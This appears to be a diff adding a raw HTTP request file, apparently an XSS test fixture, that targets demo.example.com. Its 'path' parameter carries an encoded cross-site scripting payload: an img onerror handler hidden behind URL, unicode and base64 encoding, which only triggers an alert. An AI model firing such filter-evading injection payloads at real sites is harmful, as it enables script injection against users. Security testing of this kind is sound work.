@@ -1,0 +1,4 @@
+GET /a?path=\u003Cimg%20src%3D\u0022x\u0022%20onerror%3D\u0022alert(atob(\u0027YWxlcnQoMSk%3D\u0027))\u0022\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
